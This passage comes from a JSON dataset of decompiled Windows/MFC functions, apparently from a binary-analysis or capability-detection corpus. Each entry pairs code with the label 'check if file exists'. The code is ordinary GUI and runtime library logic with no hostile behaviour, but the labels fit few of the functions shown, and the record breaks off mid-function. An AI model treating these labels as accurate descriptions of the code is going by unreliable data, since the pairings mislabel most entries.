            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpRect\n\nint32_t * __cdecl fcn.0041efe1(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint32_t arg_ch_00;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    uint32_t lpRect;\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    int32_t lprc;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t *var_18h;\n    int32_t var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    uint *var_8h;\n    uint32_t *var_4h;\n    \n    iVar6 = *in_ECX;\n    arg_8h_00 = 0x418;\n    var_4h = NULL;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    var_ch = (**(iVar6 + 0x110))(0x418, 0, 0);\n    if (var_ch == 0) goto code_r0x0041f2d3;\n    var_4h = fcn.00411579(-(var_ch * 0x14 >> 0x20 != 0) | var_ch * 0x14);\n    puVar4 = NULL;\n    if (var_ch < 1) goto code_r0x0041f2d3;\n    do {\n        arg_8h_00 = puVar4;\n        fcn.0041dbbe();\n        arg_ch_00 = var_ch;\n        puVar4 = puVar4 + 1;\n    } while (puVar4 < var_ch);\n    uVar3 = 0;\n    if (var_ch < 1) goto code_r0x0041f2d3;\n    uVar1 = in_ECX[0x20];\n    if ((uVar1 & 2) == 0) {\n        if ((uVar1 & 4) == 0) {\ncode_r0x0041f0dc:\n            uVar3 = -((arg_ch & 2) != 0) & 0x7fff;\n        }\n        else if ((arg_ch & 4) == 0) {\n            if ((arg_ch & 8) == 0) {\n                if ((arg_ch & 0x10) == 0) {\n                    if (arg_10h == -1) {\n                        if ((uVar1 & 1) == 0) goto code_r0x0041f0dc;\n                        goto code_r0x0041f077;\n                    }\n                    (*_sym.imp.USER32.dll_SetRectEmpty)(&lprc);\n                    (**(*in_ECX + 0x140))(&lprc, arg_ch & 2);\n                    lpRect = arg_ch & 0x20;\n                    if (lpRect == 0) {\n                        var_28h = var_24h - lprc;\n                    }\n                    else {\n                        var_28h = var_20h - var_28h;\n                    }\n                    uVar3 = var_28h + arg_10h;\n                }\n                else {\n                    lpRect = 0;\n                }\n            }\n            else {\n                uVar3 = 0x7fff;\n            }\n        }\n        else {\ncode_r0x0041f077:\n            uVar3 = in_ECX[0x1c];\n        }\n        fcn.0041e732(var_4h, arg_ch_00, uVar3, lpRect);\n    }\n    arg_8h_00 = &var_24h;\n    piVar2 = fcn.0041e603(arg_8h_00, var_4h, arg_ch_00);\n    iVar6 = piVar2[1];\n    *arg_8h = *piVar2;\n    arg_8h[1] = iVar6;\n    if ((arg_ch & 0x40) != 0) {\n        var_20h = in_ECX[0x28];\n        var_14h = 0;\n        arg_10h = 0;\n        in_ECX[0x28] = 0;\n        if (0 < arg_ch_00) {\n            var_18h = var_4h + 1;\n            puVar5 = var_18h;\n            uVar3 = arg_ch_00;\n            do {\n                if (((*(puVar5 + 5) & 1) != 0) && (*puVar5 != 0)) {\n                    arg_10h = arg_10h + 1;\n                }\n                puVar5 = puVar5 + 5;\n                uVar3 = uVar3 - 1;\n            } while (uVar3 != 0);\n            if (0 < arg_10h) {\n                var_14h = fcn.00411579(-(arg_10h * 0x18 >> 0x20 != 0) | arg_10h * 0x18);\n                var_10h = var_14h + 8;\n                var_1ch = arg_10h;\n                arg_10h = 0;\n                var_8h = NULL;\n                puVar5 = var_10h;\n                do {\n                    arg_ch_00 = var_ch;\n                    if (var_1ch <= arg_10h) break;\n                    puVar7 = puVar5;\n                    if (((*(var_18h + 5) & 1) != 0) && (*var_18h != 0)) {\n                        puVar5[-2] = var_8h;\n                        puVar5[-1] = *var_18h;\n                        (**(*in_ECX + 0x170))(var_8h, &lpRect);\n                        arg_8h_00 = &lpRect;\n                        fcn.0042ddc6(arg_8h_00);\n                        arg_10h = arg_10h + 1;\n                        puVar7 = var_10h + 6;\n                        *puVar5 = lpRect;\n                        puVar5[1] = var_38h;\n                        puVar5[2] = var_34h;\n                        puVar5[3] = var_30h;\n                        var_10h = puVar7;\n                    }\n                    var_8h = var_8h + 1;\n                    var_18h = var_18h + 5;\n                    arg_ch_00 = var_ch;\n                    puVar5 = puVar7;\n                } while (var_8h < var_ch);\n            }\n        }\n        if (((in_ECX[0x20] & 1U) != 0) && ((in_ECX[0x20] & 4U) != 0)) {\n            in_ECX[0x1c] = *arg_8h;\n        }\n        var_8h = NULL;\n        if (0 < arg_ch_00) {\n            var_10h = var_4h;\n            do {\n                arg_8h_00 = var_8h;\n                fcn.0041e405(var_8h, var_10h);\n                var_8h = var_8h + 1;\n                var_10h = var_10h + 5;\n            } while (var_8h < arg_ch_00);\n        }\n        if (0 < arg_10h) {\n            puVar5 = var_14h + 8;\n            do {\n                arg_8h_00 = puVar5[-1];\n                var_10h = puVar5;\n                var_1ch = fcn.0041bccc();\n                if (var_1ch != 0) {\n                    (*_sym.imp.USER32.dll_GetWindowRect)(*(var_1ch + 0x20), &lpRect);\n                    iVar8 = var_38h - puVar5[1];\n                    iVar6 = lpRect - *puVar5;\n                    (**(*in_ECX + 0x170))(var_10h[-2], &lpRect);\n                    arg_8h_00 = NULL;\n                    fcn.0041c2a1(0, iVar6 + lpRect, iVar8 + var_38h, 0, 0, 0x15);\n                    puVar5 = var_10h;\n                }\n                puVar5 = puVar5 + 6;\n                arg_10h = arg_10h - 1;\n            } while (arg_10h != 0);\n            var_10h = puVar5;\n            fcn.004115a4(var_14h, arg_8h_00);\n        }\n        in_ECX[0x28] = var_20h;\n    }\n    fcn.004115a4(var_4h);\ncode_r0x0041f2d3:\n    (*_sym.imp.USER32.dll_SetRectEmpty)(&lpRect, arg_8h_00);\n    (**(*in_ECX + 0x140))(&lpRect, arg_ch & 2);\n    arg_8h[1] = arg_8h[1] + (var_38h - var_30h);\n    *arg_8h = *arg_8h + (lpRect - var_34h);\n    fcn.00433836(&var_24h, arg_ch & 1, arg_ch & 2);\n    iVar6 = *arg_8h;\n    if (*arg_8h <= var_24h) {\n        iVar6 = var_24h;\n    }\n    *arg_8h = iVar6;\n    iVar6 = arg_8h[1];\n    if (arg_8h[1] <= var_20h) {\n        iVar6 = var_20h;\n    }\n    arg_8h[1] = iVar6;\n    return arg_8h;\n}\n",
        "token_count": 2282
    },
    "00420398": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00420398(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00418521();\n    if ((iVar1 != -1) && (iVar1 = (**(*param_1 + 0x15c))(param_2, param_3),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_PostMessageA)(param_1[8], 0x362, 0xe001, 0);\n        (**(*param_1 + 0x148))(1);\n        return 0;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 150
    },
    "00420c22": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420c22(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t in_ECX;\n    int32_t iVar7;\n    uint arg_ch_00;\n    int32_t iVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00430717(*(in_ECX + 0x20));\n    if ((arg_10h == 0) &&\n       ((*(in_ECX + 0x80) == NULL || (iVar2 = (**(**(in_ECX + 0x80) + 0x74))(arg_8h, arg_ch, 0),  iVar2 == 0)))) {\n        if (arg_8h == 0) {\n            fcn.00411e42();\n        }\n        fcn.004118a5();\n        iVar2 = fcn.0042fcbb();\n        pcVar1 = _sym.imp.USER32.dll_GetMenu;\n        if ((((*(iVar2 + 0x78) != *(arg_8h + 4)) &&\n             (iVar2 = (*_sym.imp.USER32.dll_GetMenu)(*(in_ECX + 0x20)),  iVar2 != 0)) &&\n            (iVar2 = fcn.00419eed(),  iVar2 != 0)) && (iVar2 = (*pcVar1)(*(iVar2 + 0x20)),  iVar2 != 0)) {\n            iVar3 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar2);\n            iVar7 = 0;\n            if (0 < iVar3) {\n                do {\n                    iVar8 = iVar7;\n                    iVar4 = (*_sym.imp.USER32.dll_GetSubMenu)(iVar2, iVar7);\n                    if (iVar4 == *(arg_8h + 4)) {\n                        fcn.00432144(iVar8, iVar2);\n                        break;\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < iVar3);\n            }\n        }\n        var_ch = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n        pcVar1 = _sym.imp.USER32.dll_GetMenuItemID;\n        var_24h = 0;\n        if (var_ch != 0) {\n            do {\n                uVar6 = var_24h;\n                var_28h = (*pcVar1)(*(arg_8h + 4), var_24h);\n                uVar5 = var_ch;\n                if (var_28h != 0) {\n                    if (var_28h == 0xffffffff) {\n                        iVar2 = fcn.00416cd3(uVar6, var_24h);\n                        if (((iVar2 == 0) || (var_28h = (*pcVar1)(*(iVar2 + 4), 0),  var_28h == 0)) ||\n                           (var_28h == 0xffffffff)) goto code_r0x00420d95;\n                        arg_ch_00 = 0;\n                    }\n                    else if ((*(in_ECX + 0x54) == 0) || (0xefff < var_28h)) {\n                        arg_ch_00 = 0;\n                    }\n                    else {\n                        arg_ch_00 = 1;\n                    }\n                    fcn.004118cb(in_ECX, arg_ch_00);\n                    uVar5 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n                    if (uVar5 < var_ch) {\n                        var_24h = var_24h + (uVar5 - var_ch);\n                        while ((var_24h < uVar5 && (uVar6 = (*pcVar1)(*(arg_8h + 4), var_24h),  uVar6 == var_28h))) {\n                            var_24h = var_24h + 1;\n                        }\n                    }\n                }\ncode_r0x00420d95:\n                var_ch = uVar5;\n                var_24h = var_24h + 1;\n            } while (var_24h < var_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 1001
    },
    "004249fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004249fc(uint32_t *param_1, int32_t param_2)\n\n{\n    unkuint3 Var2;\n    uint32_t uVar1;\n    \n    Var2 = *0x4bb208 >> 8;\n    if (*0x4bb208 == NULL) {\n        uVar1 = CONCAT31(Var2, 1);\n    }\n    else if ((param_2 == 0) || (*param_1 != 0xffffffff)) {\n        uVar1 = Var2 << 8;\n    }\n    else {\n        uVar1 = (**0x4bb208)(param_2);\n        *param_1 = uVar1;\n        uVar1 = uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 182
    },
    "00424a32": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00424a32(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4bb210 == NULL) {\n        return true;\n    }\n    if ((*param_1 != -1) && (param_1[1] == 0)) {\n        iVar1 = (**0x4bb210)(*param_1, param_1 + 1);\n        return iVar1 == 1;\n    }\n    return false;\n}\n",
        "token_count": 106
    },
    "00425019": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11ch\n\nvoid __cdecl fcn.00425019(int32_t Locale)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint in_ECX;\n    uint var_11ch;\n    uint lpLibFileName;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (Locale == 0x800) {\n        uVar1 = fcn.00463e16(&var_11ch, 4, 0x4950ac);\n        fcn.00401000(uVar1);\n    }\n    else {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(Locale, 3, &var_11ch, 4);\n        if (iVar5 == 0) goto code_r0x004250d9;\n    }\n    puVar2 = fcn.00462f86();\n    uVar1 = *puVar2;\n    puVar2 = fcn.00462f86();\n    *puVar2 = 0;\n    uVar3 = fcn.00463535(&lpLibFileName, 0x112, 0x111, in_ECX, &var_11ch);\n    piVar4 = fcn.00462f86();\n    if (*piVar4 == 0) {\n        puVar2 = fcn.00462f86();\n        *puVar2 = uVar1;\n    }\n    else {\n        puVar2 = fcn.00462f86();\n        fcn.0041367c(*puVar2);\n    }\n    if ((uVar3 != 0xffffffff) && (uVar3 < 0x112)) {\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)(&lpLibFileName);\n    }\ncode_r0x004250d9:\n    fcn.0045e747(var_11ch);\n    return;\n}\n",
        "token_count": 455
    },
    "004250e6": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004250e6(int32_t *param_1)\n\n{\n    if ((*0x4bb20c != NULL) && (*param_1 != -1)) {\n        fcn.00424a5f();\n        (**0x4bb20c)(*param_1);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00426289": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00426289(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    uVar1 = fcn.0042407a();\n    fcn.0040f840(uVar1);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040f670(*(unaff_EBP + 8));\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    if (arg_10h_00 == -1) {\n        arg_10h_00 = *(unaff_EBP + 8);\n    }\n    fcn.00426240(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), arg_10h_00);\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 273
    },
    "0042742d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042742d(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0042f4a6();\n    if (piVar1 == NULL) {\n        fcn.00411e0e();\n    }\n    piVar1[0xd] = 0;\n    iVar2 = fcn.004272c5(arg_14h | 4, arg_10h, arg_18h);\n    if (iVar2 == 0) {\n        (**(*piVar1 + 0x78))();\n        piVar1 = NULL;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(piVar1[0xb], arg_ch);\n        if (((arg_14h & 4) == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_ResumeThread)(piVar1[0xb]),  iVar2 == -1)) {\n            fcn.00411e42();\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 265
    },
    "00427a40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00427a40(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t extraout_ECX;\n    int32_t iVar1;\n    \n    if (param_2 + 1 < 10) goto code_r0x00427a52;\n    do {\n        do {\n            param_2 = fcn.00411e42();\n            param_1 = extraout_ECX;\ncode_r0x00427a52:\n            if (param_2 == 8) {\n                return 8;\n            }\n            if (param_2 == 0xffffffff) {\n                return 0xffffffff;\n            }\n        } while ((param_2 < 0) || (7 < param_2));\n        iVar1 = param_2 * 0x20;\n        if (-1 < *(param_1 + 0x10) - *(param_1 + 8)) goto code_r0x00427a8e;\n        param_2 = *(iVar1 + 0x495350);\n    } while ((param_2 < 0) || (7 < param_2));\n    iVar1 = param_2 << 5;\ncode_r0x00427a8e:\n    if (*(param_1 + 0x14) - *(param_1 + 0xc) < 0) {\n        param_2 = *(iVar1 + 0x495354);\n    }\n    return param_2;\n}\n",
        "token_count": 318
    },
    "0043fcc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043fcc0(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe08;\n    \n    fcn.004627e2();\n    *extraout_ECX = vtable.CFile.0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.0043fab8();\n    }\n    fcn.00402740();\n    *in_FS_OFFSET = uStackY532;\n    fcn.0045e747(in_stack_fffffe08);\n    return;\n}\n",
        "token_count": 144
    },
    "00429ddc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00429ddc(uint32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    puVar2 = arg_ch;\n    *arg_ch = 1;\n    fcn.00429d55(&arg_ch + 3);\n    if (arg_ch._3_1_ == -1) {\n        fcn.00410360(&arg_8h);\n        if (arg_8h == -2) {\n            *puVar2 = 2;\n            fcn.00429d55(&arg_ch + 3);\n            if (arg_ch._3_1_ != -1) goto code_r0x00429e00;\n            fcn.00410360(&arg_8h);\n        }\n        if (arg_8h == -1) {\n            fcn.004103b0(&arg_ch);\n            puVar2 = arg_ch;\n            if (arg_ch == 0xffffffff) {\n                fcn.00429d94(&var_8h);\n                if ((var_4h != 0) || (puVar2 = var_8h,  0x7fffffff < var_8h)) {\n                    fcn.004299a5(1, 0);\n                    pcVar1 = swi(3);\n                    puVar2 = (*pcVar1)();\n                    return puVar2;\n                }\n            }\n        }\n        else {\n            puVar2 = arg_8h & 0xffff;\n        }\n    }\n    else {\ncode_r0x00429e00:\n        puVar2 = arg_ch >> 0x18;\n    }\n    return puVar2;\n}\n",
        "token_count": 385
    },
    "0042a727": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042a727(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00418521();\n    if (iVar1 != -1) {\n        if ((*param_2 != 0) && (*(*param_2 + 4) != 0)) {\n            fcn.004286a7(param_1);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "0042f6c9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f6c9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint arg_8h;\n    uint uStack564;\n    uint uStack560;\n    uchar *puStack556;\n    uint uStack544;\n    uint uStack536;\n    uchar auStack532 [96];\n    uchar auStack436 [424];\n    int16_t iStack12;\n    ushort uStack10;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack436;\n    fcn.0042f5ec();\n    uVar2 = *(param_1 + 8);\n    uStack10 = 0;\n    iStack12 = 0;\n    arg_8h = 0x105;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(uVar2, auStack532);\n    if (iVar1 != 0) {\n        if (iStack12 == 0) {\n            puStack556 = auStack532;\n            puVar3 = &uStack564;\n            uStack564 = 0x20;\n            uStack560 = 0x88;\n            uStack544 = 2;\n            uStack536 = uVar2;\n            iVar1 = fcn.0042f65a(puVar3);\n            *(param_1 + 0x80) = iVar1;\n            if (iVar1 == -1) {\n                uStack544 = 3;\n                uVar2 = fcn.0042f65a(&uStack564);\n                *(param_1 + 0x80) = uVar2;\n            }\n            if (*(param_1 + 0x80) == -1) {\n                uStack544 = 1;\n                iVar1 = fcn.0042f65a(puVar3, &uStack564);\n                *(param_1 + 0x80) = iVar1;\n                if (iVar1 == -1) {\n                    *(param_1 + 0x80) = 0;\n                }\n            }\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x6f);\n        }\n    }\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 507
    },
    "0042fcd4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042fcd4(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    puVar1 = extraout_ECX[0x12];\n    *(unaff_EBP + -4) = 1;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        (**(*extraout_ECX[0x1c] + 0xc))(extraout_ECX + 0x13);\n        if (extraout_ECX[0x1c] != NULL) {\n            (**(*extraout_ECX[0x1c] + 4))(1);\n        }\n    }\n    if (*extraout_ECX[0x1e] != NULL) {\n        (****extraout_ECX[0x1e])(1);\n    }\n    if (*(extraout_ECX[0x1e] + 4) != NULL) {\n        (****(extraout_ECX[0x1e] + 4))(1);\n    }\n    fcn.004115a4(extraout_ECX[0x1e]);\n    pcVar2 = extraout_ECX[0x20];\n    if ((pcVar2 != NULL) && (pcVar2 != 0xffffffff)) {\n        fcn.0042f66b(pcVar2);\n        extraout_ECX[0x20] = 0xffffffff;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.00430f22();\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 455
    },
    "00430303": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00430303(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043026e();\n    if ((*(iVar1 + 0x7c) == 0) || (*(param_2 + 0x80) == -1)) {\n        *(param_1 + 4) = 0;\n    }\n    else {\n        uVar2 = fcn.0042f679(*(param_2 + 0x80), param_1);\n        *(param_1 + 4) = uVar2;\n    }\n    return param_1;\n}\n",
        "token_count": 154
    },
    "00430bbd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00430bbd(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uStack12;\n    \n    param_1[5] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar3;\n    if (iVar3 == -1) {\n        uStack12 = 0x4b6188;\n        fcn.0046230a(&stack0xfffffff4, 0x4a75f0);\n        pcVar1 = swi(3);\n        piVar2 = (*pcVar1)();\n        return piVar2;\n    }\n    uStack12 = 0x430bf8;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)();\n    return param_1;\n}\n",
        "token_count": 251
    },
    "00430f52": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430f52(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.00430daa(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 230
    },
    "00431bf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00431bf0(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 293
    },
    "004329b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004329b4(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                do {\n                    piVar3 = *ppiVar1;\n                    if (piVar3 != NULL) goto code_r0x004329e4;\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar4 < *(param_1 + 8));\n                fcn.00411e42();\n                param_1 = extraout_ECX;\n            }\n        }\ncode_r0x004329e4:\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00432da4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00432da4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.00426925(),  iVar2 != 0)) && (*(iVar2 + 0x3c) != NULL)) {\n                (**(iVar2 + 0x3c))(0, 0);\n            }\n            fcn.00432c97();\n            fcn.00432c97();\n            fcn.00432c97();\n            fcn.00432c97();\n            fcn.00432c97();\n        }\n        iVar2 = fcn.0043026e();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.00430941();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.00464625(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x98))))) &&\n           (*(iVar2 + 0x98) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.00464625(*(iVar3 + 0xc));\n                